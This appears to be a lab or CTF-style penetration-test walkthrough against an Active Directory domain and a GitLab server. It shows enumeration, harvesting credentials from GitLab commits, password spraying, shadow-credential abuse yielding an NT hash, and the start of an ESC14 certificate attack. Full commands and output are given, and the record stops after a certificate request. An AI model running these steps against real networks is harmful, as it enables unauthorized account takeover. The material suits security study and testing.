# Objective and scope
You have been engaged to conduct an internal penetration test targeting a domain-joined Linux server and its underlying Domain Controller. The client wants to evaluate the true impact and potential blast radius if an unauthenticated attacker breaches the internal network.

The client has provided you with VPN access to their environment, but no other information.

# Host file setup
```python
sudo nxc smb 10.0.31.82 --generate-hosts-file /etc/hosts 
[sudo] password for kali: 
SMB         10.0.31.82      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:casper.hsm) (signing:True) (SMBv1:None) (Null Auth:True)
```

# Enumration
## Domain Controller
### Open ports
```python
nmap -p- -sT dc01.casper.hsm

Nmap scan report for dc01.casper.hsm (10.0.31.82)
Host is up (0.096s latency).
rDNS record for 10.0.31.82: DC01.casper.hsm
Not shown: 65512 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49666/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49691/tcp open  unknown
49702/tcp open  unknown
49744/tcp open  unknown
54868/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 929.00 seconds
```

### Nmap
```python
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 -A --min-rate=1000 -sT dc01.casper.hsm
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-05 16:27 +0100
Nmap scan report for dc01.casper.hsm (10.0.31.82)
Host is up (0.095s latency).
rDNS record for 10.0.31.82: DC01.casper.hsm

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-05 15:27:24Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: casper.hsm, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.casper.hsm
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.casper.hsm
| Not valid before: 2026-07-26T08:04:06
|_Not valid after:  2027-07-26T08:04:06
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: casper.hsm, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.casper.hsm
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.casper.hsm
| Not valid before: 2026-07-26T08:04:06
|_Not valid after:  2027-07-26T08:04:06
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: casper.hsm, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.casper.hsm
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.casper.hsm
| Not valid before: 2026-07-26T08:04:06
|_Not valid after:  2027-07-26T08:04:06
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: casper.hsm, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.casper.hsm
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.casper.hsm
| Not valid before: 2026-07-26T08:04:06
|_Not valid after:  2027-07-26T08:04:06
|_ssl-date: TLS randomness does not represent time
3389/tcp open  ms-wbt-server
|_ssl-date: TLS randomness does not represent time
| rdp-ntlm-info: 
|   Target_Name: CASPER
|   NetBIOS_Domain_Name: CASPER
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: casper.hsm
|   DNS_Computer_Name: DC01.casper.hsm
|   DNS_Tree_Name: casper.hsm
|   Product_Version: 10.0.26100
|_  System_Time: 2026-08-05T15:28:16+00:00
| ssl-cert: Subject: commonName=DC01.casper.hsm
| Not valid before: 2026-07-25T07:13:00
|_Not valid after:  2027-01-24T07:13:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        .NET Message Framing
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.99%I=7%D=8/5%Time=6A735661%P=x86_64-pc-linux-gnu%r(Ter
SF:minalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x02\0
SF:\0\0");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 3 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Linux Server
### Open ports
```python
rustscan -a nix01.casper.hsm

Open 10.0.20.54:22
Open 10.0.20.54:80
Open 10.0.20.54:8060
Open 10.0.20.54:9094
```

Nmap was taking too long!

### Nmap
```python
nmap -p 22,80,8060,9094 -A --min-rate=1000 -sT nix01.casper.hsm
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-05 16:38 +0100
Nmap scan report for nix01.casper.hsm (10.0.20.54)
Host is up (0.095s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u10 (protocol 2.0)
| ssh-hostkey: 
|   256 79:c2:75:81:0e:45:1e:43:f8:b0:0d:57:af:73:80:01 (ECDSA)
|_  256 eb:04:d8:19:be:0a:10:2e:43:cd:e7:5c:c3:7f:06:fd (ED25519)
80/tcp   open  http    nginx
| http-robots.txt: 87 disallowed entries (15 shown)
| / /autocomplete/users /autocomplete/projects /search 
| /admin /profile /dashboard /users /api/v* /help /s/ /-/profile 
|_/-/profile/ /-/user_settings/ /-/ide/
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://nix01.casper.hsm/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
8060/tcp open  http    nginx 1.31.0
|_http-title: 404 Not Found
|_http-server-header: nginx/1.31.0
9094/tcp open  unknown
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Linux Server Service Enumeration

## SSH (22)
```python
ssh root@nix01.casper.hsm
The authenticity of host 'nix01.casper.hsm (10.0.20.54)' can't be established.
ED25519 key fingerprint is: SHA256:u3NhqmQvMrHTZGkskiKG8VmgnegfUnHX4vCAEfFrFjs
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'nix01.casper.hsm' (ED25519) to the list of known hosts.
root@nix01.casper.hsm's password:
```

Password based authentication!

## HTTP (80)
![](Pasted%20image%2020260805164236.png)

Looks like there is a GitLab instance

### Nuclei
```python
[graphql-alias-batching] [http] [info] http://nix01.casper.hsm/api/graphql
[graphql-ruby-detect] [http] [info] http://nix01.casper.hsm/api/graphql
[graphql-detect] [http] [info] http://nix01.casper.hsm//api/graphql [paths="/api/graphql"]
[oauth2-detect] [http] [info] http://nix01.casper.hsm/oauth/token
[waf-detect:nginxgeneric] [http] [info] http://nix01.casper.hsm/
[ssh-auth-methods] [javascript] [info] nix01.casper.hsm:22 ["["publickey","gssapi-keyex","gssapi-with-mic","password"]"]
[ssh-password-auth] [javascript] [info] nix01.casper.hsm:22
[ssh-server-enumeration] [javascript] [info] nix01.casper.hsm:22 ["SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u10"]
[ssh-sha1-hmac-algo] [javascript] [info] nix01.casper.hsm:22
[openssh-detect] [tcp] [info] nix01.casper.hsm:22 ["SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u10"]
[oidc-detect] [http] [info] http://nix01.casper.hsm/.well-known/openid-configuration
[keycloak-openid-config] [http] [info] http://nix01.casper.hsm/.well-known/openid-configuration
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://nix01.casper.hsm/users/sign_in
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://nix01.casper.hsm/users/sign_in
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://nix01.casper.hsm/users/sign_in
[missing-cookie-samesite-strict] [http] [info] http://nix01.casper.hsm/users/sign_in ["preferred_language=en; path=/ _gitlab_session=2025723a7a4e33fbc5fd67d197868df2; path=/; HttpOnly"]
[tech-detect:nginx] [http] [info] http://nix01.casper.hsm/users/sign_in
[tech-detect:nginx] [http] [info] http://nix01.casper.hsm/
[oauth-authorization-server-exposure] [http] [info] http://nix01.casper.hsm/.well-known/oauth-authorization-server
[robots-txt] [http] [info] http://nix01.casper.hsm/robots.txt
[graphql-get-method] [http] [info] http://nix01.casper.hsm/api/graphql?query={__typename}
[google-floc-disabled] [http] [info] http://nix01.casper.hsm/
[weak-csp-detect:missing-script-src] [http] [info] http://nix01.casper.hsm/ ["Content-Type: text/html; charset=utf-8"]
[weak-csp-detect:missing-object-src] [http] [info] http://nix01.casper.hsm/ ["Content-Type: text/html; charset=utf-8"]
[xss-deprecated-header] [http] [info] http://nix01.casper.hsm/ ["1; mode=block"]
[gitlab-detect] [http] [info] http://nix01.casper.hsm/users/sign_in
[gitlab-explore:gitlab-community] [http] [info] http://nix01.casper.hsm/api/v4/projects
```

There is nothing obvious i can do here!

![](Pasted%20image%2020260805170006.png)

Using the `Explore` button in the bottom left of the login page i get guest access and looks like there is an inactive project!

![](Pasted%20image%2020260805170240.png)

Searchign through the commits i find one for `Add new file` which looks to expose credentials for the `xjr` user

```python
xjr:xjrcat2026!
```

These credentials dont let me authenticate to the DC or SSH on the linux server

But they do get me access to the GitLab instance!

![](Pasted%20image%2020260805170908.png)

I have found another Project

![](Pasted%20image%2020260805171412.png)

Using the operate tab on the left i find a stopped environment which ones agains leaks credentials!

```python
fFvq52PzJpO98X8!
```

I am not given a username so ill use kerbrute to try an enumerate some users

# Password Spray leads to user compromise

```python
kerbrute userenum --dc dc01.casper.hsm -d casper.hsm /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 08/05/26 - Ronnie Flathers @ropnop

2026/08/05 16:53:52 >  Using KDC(s):
2026/08/05 16:53:52 >  	dc01.casper.hsm:88

2026/08/05 16:54:04 >  [+] VALID USERNAME:	jay@casper.hsm
2026/08/05 16:54:10 >  [+] VALID USERNAME:	administrator@casper.hsm
2026/08/05 16:54:18 >  [+] VALID USERNAME:	carlito@casper.hsm
2026/08/05 16:55:02 >  [+] VALID USERNAME:	Jay@casper.hsm
2026/08/05 16:55:28 >  [+] VALID USERNAME:	points@casper.hsm
2026/08/05 16:55:39 >  [+] VALID USERNAME:	JAY@casper.hsm
2026/08/05 16:56:08 >  [+] VALID USERNAME:	Administrator@casper.hsm
```

Found user `jay` `carlito` and `points`

I can try and spray the password against these users!

```python
nxc smb dc01.casper.hsm -u users.txt -p 'fFvq52PzJpO98X8!' --smb-timeout 5 --continue-on-success
SMB         10.0.31.82      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:casper.hsm) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.31.82      445    DC01             [-] casper.hsm\jay:fFvq52PzJpO98X8! STATUS_LOGON_FAILURE 
SMB         10.0.31.82      445    DC01             [-] casper.hsm\points:fFvq52PzJpO98X8! STATUS_LOGON_FAILURE 
SMB         10.0.31.82      445    DC01             [-] casper.hsm\carlito:fFvq52PzJpO98X8! STATUS_LOGON_FAILURE 
SMB         10.0.31.82      445    DC01             [+] casper.hsm\xjr:fFvq52PzJpO98X8!
```

I also assumed `xjr` would be a user so i added them to the list!

# Enumeration as `xjr`

## Shares
```python
nxc smb dc01.casper.hsm -u xjr -p 'fFvq52PzJpO98X8!' --smb-timeout 5 --shares
SMB         10.0.31.82      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:casper.hsm) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.31.82      445    DC01             [+] casper.hsm\xjr:fFvq52PzJpO98X8! 
SMB         10.0.31.82      445    DC01             [*] Enumerated shares
SMB         10.0.31.82      445    DC01             Share           Permissions     Remark
SMB         10.0.31.82      445    DC01             -----           -----------     ------
SMB         10.0.31.82      445    DC01             ADMIN$                          Remote Admin
SMB         10.0.31.82      445    DC01             C$                              Default share
SMB         10.0.31.82      445    DC01             IPC$            READ            Remote IPC
SMB         10.0.31.82      445    DC01             NETLOGON        READ            Logon server share 
SMB         10.0.31.82      445    DC01             SYSVOL          READ            Logon server share
```

No interesting access on shares!

## Users
```python
nxc smb dc01.casper.hsm -u xjr -p 'fFvq52PzJpO98X8!' --smb-timeout 5 --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
Administrator
Guest
krbtgt
DC01$
NIX01$
xjr
jags
jay
points
carlito
casper-gmsa$
```

Ill use `--rid-brute` to also get machine accounts, then use my linux cli skills to output this to a user file

There is also no lockout policy, so password spraying is something i can try!

## BloodyAD get writable
```python
bloodyAD --host dc01.casper.hsm -d casper.hsm -u xjr -p 'fFvq52PzJpO98X8!' get writable --detail

...[SNIP]...

distinguishedName: CN=jags,CN=Users,DC=casper,DC=hsm
msDS-KeyCredentialLink: WRITE

distinguishedName: CN=jay,CN=Users,DC=casper,DC=hsm
altSecurityIdentities: WRITE
```

`msDS-KeyCredentialLink: WRITE` allows me to apply shadow credentials!

`altSecurityIdentities: WRITE` means i can exploit ESC14

# Shadow Credentials leads to user compromise of `jags`

```python
certipy-ad shadow auto -u xjr@casper.hsm -p 'fFvq52PzJpO98X8!' -account 'jags'
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: CASPER.HSM.
[!] Use -debug to print a stacktrace
[*] Targeting user 'jags'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '41a526bd9975481694f23e02e964ad60'
[*] Adding Key Credential with device ID '41a526bd9975481694f23e02e964ad60' to the Key Credentials for 'jags'
[*] Successfully added Key Credential with device ID '41a526bd9975481694f23e02e964ad60' to the Key Credentials for 'jags'
[*] Authenticating as 'jags' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'jags@casper.hsm'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'jags.ccache'
[*] Wrote credential cache to 'jags.ccache'
[*] Trying to retrieve NT hash for 'jags'
[*] Restoring the old Key Credentials for 'jags'
[*] Successfully restored the old Key Credentials for 'jags'
[*] NT hash for 'jags': 68fc3adf1953f5e6851c0dd297562e08
```

Now i have this users NT hash

```python
nxc smb dc01.casper.hsm -u jags -H '68fc3adf1953f5e6851c0dd297562e08' --smb-timeout 5
SMB         10.0.31.82      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:casper.hsm) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.31.82      445    DC01             [+] casper.hsm\jags:68fc3adf1953f5e6851c0dd297562e08
```

This user is now compromised!

I will also now collect bloodhound data

# ESC14

```python
certipy-ad find -u jags@casper.hsm -hashes ':68fc3adf1953f5e6851c0dd297562e08' -dc-host dc01.casper.hsm -dc-ip 10.0.31.82 -stdout -enabled

Certificate Templates
  0
    Template Name                       : CasperCorp-User
    Display Name                        : CasperCorp-User
    Certificate Authorities             : casper-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 99 years
    Renewal Period                      : 69 years
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-07-28T00:54:27+00:00
    Template Last Modified              : 2026-07-28T03:57:22+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CASPER.HSM\CasperCorpCertificateUsers
                                          CASPER.HSM\Domain Admins
                                          CASPER.HSM\Enterprise Admins
      Object Control Permissions
        Owner                           : CASPER.HSM\Administrator
        Full Control Principals         : CASPER.HSM\Domain Admins
                                          CASPER.HSM\Enterprise Admins
        Write Owner Principals          : CASPER.HSM\Domain Admins
                                          CASPER.HSM\Enterprise Admins
        Write Dacl Principals           : CASPER.HSM\Domain Admins
                                          CASPER.HSM\Enterprise Admins
        Write Property Enroll           : CASPER.HSM\Domain Admins
                                          CASPER.HSM\Enterprise Admins
    [+] User Enrollable Principals      : CASPER.HSM\CasperCorpCertificateUsers
```

I found a template that the `jags` user can enroll in since they are a part of the group `CasperCorpCertificateUsers`

And also the user `xjr` has  `altSecurityIdentities: WRITE` on `jay` , so this meets all the requirements of ESC14

www.hackingarticles.in/adcs-esc14-write-access-on-altsecurityidentities/

```python
certipy-ad req -u jags@casper.hsm -hashes ':68fc3adf1953f5e6851c0dd297562e08' -ca casper-DC01-CA -template CasperCorp-User -target dc01.casper.hsm -debug

...[SNIP]...

[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.0.31.82[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.0.31.82[\pipe\cert]
[*] Request ID is 60
[*] Successfully requested certificate
[*] Got certificate without identity
[+] Found SID in security extension: 'S-1-5-21-247086266-1178499391-1139383971-1105'
[*] Certificate object SID is 'S-1-5-21-247086266-1178499391-1139383971-1105'
[*] Saving certificate and private key to 'jags.pfx'
[+] Attempting to write data to 'jags.pfx'
[+] Data written to 'jags.pfx'
[*] Wrote certificate and private key to 'jags.pfx'
```

First i have to request a certificate 